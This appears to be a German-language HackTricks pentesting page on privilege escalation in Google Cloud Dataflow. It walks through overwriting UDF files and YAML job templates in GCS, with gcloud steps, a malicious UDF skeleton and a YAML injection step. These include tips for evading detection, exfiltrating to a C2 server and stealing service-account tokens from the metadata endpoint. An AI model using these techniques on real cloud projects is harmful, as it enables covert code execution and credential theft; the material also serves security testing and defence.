# GCP - Dataflow Privilege Escalation

{{#include ../../../banners/hacktricks-training.md}}

## Dataflow

{{#ref}}
../gcp-services/gcp-dataflow-enum.md
{{#endref}}

### `storage.objects.create`, `storage.objects.get`, `storage.objects.update`

Dataflow validiert nicht die Integrität von UDFs und Job-Template-YAMLs, die in GCS gespeichert sind.
Mit Schreibzugriff auf den Bucket kannst du diese Dateien überschreiben, um Code zu injizieren, Code auf den Workern auszuführen, Service-Account-Tokens zu stehlen oder die Datenverarbeitung zu verändern.
Sowohl Batch- als auch Streaming-Pipeline-Jobs sind mögliche Ziele für diesen Angriff. Um diesen Angriff gegen eine Pipeline durchzuführen, müssen wir UDFs/Templates ersetzen, bevor der Job läuft, während der ersten Minuten (bevor die Job-Worker erstellt werden) oder während der Job-Ausführung, bevor neue Worker hochgefahren werden (aufgrund von Autoscaling).

**Attack vectors:**
- **UDF hijacking:** Python (`.py`) und JS (`.js`) UDFs, die von Pipelines referenziert und in kundengemanagten Buckets gespeichert sind
- **Job template hijacking:** Eigene YAML-Pipeline-Definitionen, die in kundengemanagten Buckets gespeichert sind


> [!WARNING]
> **Run-once-per-worker trick:** Dataflow UDFs und template callables werden **pro Zeile/Eintrag** aufgerufen. Ohne Koordination würde Exfiltration oder Token-Diebstahl tausende Male ausgeführt werden, was Lärm, Rate-Limiting und Erkennung verursacht. Verwende ein **file-based coordination** pattern: prüfe zu Beginn, ob eine Marker-Datei (z. B. `/tmp/pwnd.txt`) existiert; wenn sie existiert, überspringe den bösartigen Code; wenn nicht, führe den Payload aus und erstelle die Datei. Das stellt sicher, dass der Payload **einmal pro Worker** ausgeführt wird, nicht pro Zeile.


#### Direct exploitation via gcloud CLI

1. Enumerate Dataflow jobs and locate the template/UDF GCS paths:

<details>

<summary>Jobs auflisten und describe verwenden, um Template-Pfad, staging location und UDF-Referenzen zu erhalten</summary>
```bash
# List jobs (optionally filter by region)
gcloud dataflow jobs list --region=<region>
gcloud dataflow jobs list --project=<PROJECT_ID>

# Describe a job to get template GCS path, staging location, and any UDF/template references
gcloud dataflow jobs describe <JOB_ID> --region=<region> --full --format="yaml"
# Look for: currentState, createTime, jobMetadata, type (JOB_TYPE_STREAMING or JOB_TYPE_BATCH)
# Pipeline options often include: tempLocation, stagingLocation, templateLocation, or flexTemplateGcsPath
```
</details>

2. Lade die ursprüngliche UDF- oder Jobvorlage aus GCS herunter:

<details>

<summary>UDF-Datei oder YAML-Vorlage aus dem Bucket herunterladen</summary>
```bash
# If job references a UDF at gs://bucket/path/to/udf.py
gcloud storage cp gs://<BUCKET>/<PATH>/<udf_file>.py ./udf_original.py

# Or for a YAML job template
gcloud storage cp gs://<BUCKET>/<PATH>/<template>.yaml ./template_original.yaml
```
</details>

3. Bearbeite die Datei lokal: injiziere die malicious payload (siehe die untenstehenden Python UDF- oder YAML-Snippets) und stelle sicher, dass das run-once coordination pattern verwendet wird.

4. Lade die Datei erneut hoch, um die Originaldatei zu überschreiben:

<details>

<summary>Overwrite UDF or template in bucket</summary>
```bash
gcloud storage cp ./udf_injected.py gs://<BUCKET>/<PATH>/<udf_file>.py

# Or for YAML
gcloud storage cp ./template_injected.yaml gs://<BUCKET>/<PATH>/<template>.yaml
```
</details>

5. Warte auf den nächsten Joblauf oder (bei Streaming) löse Autoscaling aus (z. B. durch Fluten der Pipeline-Eingabe), damit neue Workers hochfahren und die modifizierte Datei abrufen.

#### Python UDF injection

Wenn du möchtest, dass der Worker Daten zu deinem C2-Server exfiltriert, verwende `urllib.request` und nicht `requests`.
`requests` ist auf klassischen Dataflow-Workers nicht vorinstalliert.

<details>

<summary>Malicious UDF with run-once coordination and metadata extraction</summary>
```python
import os
import json
import urllib.request
from datetime import datetime

def _malicious_func():
# File-based coordination: run once per worker.
coordination_file = "/tmp/pwnd.txt"
if os.path.exists(coordination_file):
return

# malicous code goes here
with open(coordination_file, "w", encoding="utf-8") as f:
f.write("done")

def transform(line):
# Malicous code entry point - runs per line but coordination ensures once per worker
try:
_malicious_func()
except Exception:
pass
# ... original UDF logic follows ...
```
</details>


#### Job template YAML injection

Injiziere einen `MapToFields` step mit einem `callable`, das eine Koordinationsdatei verwendet. Bei YAML-basierten Pipelines, die `requests` unterstützen, verwende dieses Paket, wenn die Vorlage `dependencies: [requests]` deklariert; andernfalls verwende `urllib.request`.

Füge den Cleanup-Step (`drop: [malicious_step]`) hinzu, damit die Pipeline weiterhin gültige Daten an das Ziel schreibt.

<details>

<summary>Bösartiger MapToFields step und Bereinigung im Pipeline-YAML</summary>
```yaml
- name: MaliciousTransform
type: MapToFields
input: Transform
config:
language: python
fields:
malicious_step:
callable: |
def extract_and_return(row):
import os
import json
from datetime import datetime
coordination_file = "/tmp/pwnd.txt"
if os.path.exists(coordination_file):
return True
try:
import urllib.request
# malicious code goes here
with open(coordination_file, "w", encoding="utf-8") as f:
f.write("done")
except Exception:
pass
return True
append: true
- name: CleanupTransform
type: MapToFields
input: MaliciousTransform
config:
fields: {}
append: true
drop:
- malicious_step
```
</details>

### Compute Engine-Zugriff auf Dataflow-Worker

**Permissions:** `compute.instances.osLogin` or `compute.instances.osAdminLogin` (with `iam.serviceAccounts.actAs` over the worker SA), or `compute.instances.setMetadata` / `compute.projects.setCommonInstanceMetadata` (with `iam.serviceAccounts.actAs`) for legacy SSH key injection

Dataflow workers laufen als Compute Engine VMs. Zugriff auf Worker über OS Login oder SSH ermöglicht das Auslesen von SA-Tokens vom Metadaten-Endpunkt (`http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token`), das Manipulieren von Daten oder das Ausführen beliebigen Code.

Für Details zur Ausnutzung siehe:
- [GCP - Compute Privesc](gcp-compute-privesc/README.md) — `compute.instances.osLogin`, `compute.instances.osAdminLogin`, `compute.instances.setMetadata`

## Referenzen

- [Dataflow Rider: How Attackers can Abuse Shadow Resources in Google Cloud Dataflow](https://www.varonis.com/blog/dataflow-rider)
- [Control access with IAM (Dataflow)](https://cloud.google.com/dataflow/docs/concepts/security-and-permissions)
- [gcloud dataflow jobs describe](https://cloud.google.com/sdk/gcloud/reference/dataflow/jobs/describe)
- [Apache Beam YAML: User-defined functions](https://beam.apache.org/documentation/sdks/yaml-udf/)
- [Apache Beam YAML Transform Reference](https://beam.apache.org/releases/yamldoc/current/)

{{#include ../../../banners/hacktricks-training.md}}
